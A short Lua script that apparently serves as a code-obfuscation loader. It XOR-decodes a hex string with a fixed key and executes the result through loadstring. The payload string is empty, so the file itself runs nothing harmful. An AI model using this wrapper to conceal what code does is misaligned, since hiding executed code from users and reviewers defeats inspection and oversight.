local k={252,43,229,44,93,43,136,5,195,247,100,17,71,138,82,172,169,244,208,31,62,47,30,30,181,143,251,184,211,171,185,36}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
fn()
